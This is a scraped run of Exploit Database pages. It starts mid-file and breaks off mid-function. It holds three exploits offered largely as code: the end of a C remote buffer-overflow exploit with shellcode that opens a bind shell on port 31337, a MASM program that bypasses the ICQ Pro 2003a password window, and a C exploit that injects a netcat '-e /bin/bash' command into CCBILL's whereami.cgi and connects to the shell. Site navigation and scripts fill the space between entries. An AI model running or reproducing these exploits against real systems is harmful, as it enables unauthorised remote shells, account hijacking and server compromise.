{if((n=read(0,buff,sizeof(buff)))<=0){perror ("read user");exit(EXIT_FAILURE);}write(sock,buff,n);}}close(sock);}int main(int argc, char **argv){struct hostent *he;struct sockaddr_in sock1;struct sockaddr_in sock2;unsigned short port;unsigned long ret=RET;char buffer[100000];int sock, sck, h,i,j;if (argc != 2) usage(argv[0]);printf("Resolving %s .. ", argv[1]);if ((he = gethostbyname(argv[1])) == NULL){fprintf(stderr, "Unknown host\n");exit(-1);}printf("Resolved\n");port = htons(31337);port ^= 0x9999;*(unsigned short *)&shellcode[PORT_OFFSET] = port;*(unsigned long *)&shellcode[LOADL_OFFSET] = LOADLIBRARYA ^ 0x99999999;*(unsigned long *)&shellcode[GETPROC_OFFSET] = GETPROCADDRESS ^ 0x99999999;bcopy(he->h_addr, &sock1.sin_addr, he->h_length);sock1.sin_family = AF_INET;sock1.sin_port = htons(80);printf("[+] Attacking to %s via port: 80\n", argv[1]);if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {perror("Failed to create socket");exit(-1);}if (connect(sock, (struct sockaddr *)&sock1, sizeof(sock1)) == -1){perror("Failed to connect");exit(-1);}bzero(buffer,100000);strcpy(buffer,"SEARCH /");i = strlen(buffer);buffer[i] = NOP;for (j=i+1; j < i+2150; j+=2)*(unsigned short *)&buffer[j] = (unsigned short)ret;for (; j < i+65535-strlen(jumpcode); j++)buffer[j] = NOP;memcpy(&buffer[j], jumpcode, strlen(jumpcode));strcpy(buffer+strlen(buffer), " HTTP/1.1\r\n");sprintf(buffer+strlen(buffer), "Host: %s\r\nContent-Type: text/xml\r\n""Content-Length: %d\r\n\r\n", argv[1], strlen(body)+ strlen(shellcode));strcpy(buffer+strlen(buffer), body);memset(buffer+strlen(buffer), 0x01, 1);memset(buffer+strlen(buffer), NOP, 3);strcpy(buffer+strlen(buffer), shellcode);if (send(sock, buffer, strlen(buffer), 0) != strlen(buffer)){perror("Failed to send");exit(-1);}printf("[+] Overflow sent, waiting for 5 seconds\n");sleep(5);bcopy(he->h_addr, &sock2.sin_addr, he->h_length);sock2.sin_family = AF_INET;sock2.sin_port = htons(31337);printf("[+] Connecting to %s: 31337\n", argv[1]);if ((sck = socket(AF_INET, SOCK_STREAM, 0)) == -1) {perror("Failed to create socket");exit(-1);}if (connect(sck, (struct sockaddr *)&sock2, sizeof(sock2)) == -1){printf("[+] Unable to connect.\n""[+] Exploitation failed, maybe blocked by firewall.\n");close(sock);close(sck);exit(-1);}close(sock);printf("[+] Successfull, attempting to join shell ...\n\n");shell(sck);return 0;}// milw0rm.com [2003-07-08]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 52
ICQ Pro 2003a - 'ca1-icq.asm' Password Bypass - Windows local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDICQ Pro 2003a - 'ca1-icq.asm' Password BypassEDB-ID:52CVE:EDB Verified:Author:Caua Moura PradoType:localExploit:/Platform:WindowsDate:2003-07-09Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<;         CUT HERE - CUTE HERE - ca1-icq.asm - CUT HERE - CUT HERE      BOF; -------------------------------------------------------------------------;;  07/02/2003 - ca1-icq.asm;  ICQ Password Bypass exploit.;  written by Caua Moura Prado (aka ca1);;  This exploit allows you to login to ICQ server using any account registered *locally*;  no matter the 'save password' option is checked or not. High level security is also bypassed.;  All you have to do is run the exploit and set status property using your mouse when the flower;  is yellow. If you accidentally set status to offline then you will need to restart ICQ and run;  the exploit again.;;        uh-oh!;         ___;      __/   \__;     /  \___/  \        Vulnerable:;     \__/+ +\__/          ICQ Pro 2003a Build #3800;     /   ~~~   \;     \__/   \__/        Not Vulnerable:;        \___/                ICQ Lite alpha Build 1211;                               ICQ 2001b and ICQ 2002a;    tHe Flaw Power       All other versions were not tested.;coded with masm32; ________________________________________________________________exploit born in .br.386.model flat, stdcalloption casemap:noneinclude \masm32\include\user32.incinclude \masm32\include\kernel32.incincludelib \masm32\lib\user32.libincludelib \masm32\lib\kernel32.lib.dataszTextHigh byte 'Password Verification', 0szTextLow byte 'Login to server', 0szClassName byte '#32770', 0.data?hWndLogin dword ?.code_entrypoint:invoke FindWindow, addr szClassName, addr szTextHighmov hWndLogin, eax.if hWndLogin == 0invoke FindWindow, addr szClassName, addr szTextLowmov hWndLogin, eax.endifinvoke GetParent, hWndLogininvoke EnableWindow, eax, 1      ;Enable ICQ contactlistinvoke ShowWindow, hWndLogin, 0  ;get rid of Loginscreen (don't kill this window)invoke ExitProcess, 0            ;uhuu.. cya! i gottasleep!end _entrypoint; <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<;         CUT HERE - CUTE HERE - ca1-icq.asm - CUT HERE - CUT HERE      EOF; -------------------------------------------------------------------------; milw0rm.com [2003-07-09]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 53
CCBILL CGI - 'ccbillx.c' 'whereami.cgi' Remote Code Execution - CGI webapps Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDCCBILL CGI - 'ccbillx.c' 'whereami.cgi' Remote Code ExecutionEDB-ID:53CVE:EDB Verified:Author:knight420Type:webappsExploit:/Platform:CGIDate:2003-07-10Vulnerable App:Become a Certified Penetration TesterEnroll inAdvanced Web Attacks and Exploitation, the courserequired to become anOffensive Security Web Expert (OSWE)GET CERTIFIED/** =====================================* CCBILL CGI Remote Exploit for /ccbill/whereami.cgi* By: Knight420* 7/07/03** spawns a shell with netcat and attempts to connect* into the server on port 6666 to gain access of the* webserver uid** (C) COPYRIGHT Blue Ballz , 2003* all rights reserved* =====================================**/#include <sys/types.h>#include <sys/time.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#include <unistd.h>#include <errno.h>#include <stdlib.h>#include <stdio.h>#include <string.h>#include <fcntl.h>#include <netdb.h>unsigned long int	net_resolve (char *host);int			net_connect (struct sockaddr_in *cs, char *server,unsigned short int port, int sec);unsigned char ccbill[] ="GET /ccbill/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\x0d\x0a""GET /cgi-bin/ccbill/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\x0d\x0a""GET /cgi-bin/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\x0d\x0a";intmain (int argc, char **argv){int			socket;char  *TARGET     =     "TARGET";char			*server;unsigned short int	port;struct sockaddr_in	sa;if (argc != 3) {system("clear");printf ("[CCBILL CGI Remote Exploit By:Knight420]\n""usage: %s <host> <port>\n");exit (EXIT_FAILURE);}setenv (TARGET, argv[1], 1);server = argv[1];port = atoi (argv[2]);socket = net_connect (&sa, server, port, 35);if (socket <= 0) {perror ("net_connect");exit (EXIT_FAILURE);}write (socket, ccbill, strlen (ccbill));sleep (1);close (socket);printf ("[CCBILL CGI Remote Exploit By:Knight420]\n");printf ("[1] evil data sent.\n", server);printf ("[2] connecting to shell.\n", server);system("nc ${TARGET} 6666 || echo '[-]Exploit failed!'");exit (EXIT_SUCCESS);}unsigned long intnet_resolve (char *host){long		i;struct hostent	*he;i = inet_addr (host);if (i == -1) {he = gethostbyname (host);if (he == NULL) {return (0);} else {return (*(unsigned long *) he->h_addr);}}return (i);}intnet_connect (struct sockaddr_in *cs, char *server,unsigned short int port, int sec){int		n, len, error, flags;int		fd;struct timeval	tv;fd_set		rset, wset;/* first allocate a socket */cs->sin_family = AF_INET;cs->sin_port = htons (port);fd = socket (cs->sin_family, SOCK_STREAM, 0);if (fd == -1)return (-1);cs->sin_addr.s_addr = net_resolve (server);if (cs->sin_addr.s_addr == 0) {close (fd);return (-1);}flags = fcntl (fd, F_GETFL, 0);if (flags == -1) {close (fd);return (-1);}n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);if (n == -1) {close (fd);return (-1);}error = 0;n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));if (n < 0) {if (errno != EINPROGRESS) {close (fd);return (-1);}}if (n == 0)goto done;FD_ZERO(&rset);FD_ZERO(&wset);FD_SET(fd, &rset);FD_SET(fd, &wset);tv.tv_sec = sec;tv.tv_usec = 0;n = select(fd + 1, &rset, &wset, NULL, &tv);if (n == 0) {close(fd);errno = ETIMEDOUT;return (-1);}if (n == -1)return (-1);if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {len = sizeof(error);if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {errno = ETIMEDOUT;return (-1);}if (error == 0) {goto done;} else {errno = error;return (-1);}}} elsereturn (-1);done:n = fcntl(fd, F_SETFL, flags);if (n == -1)return (-1);return (fd);}// milw0rm.com [2003-07-10]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) 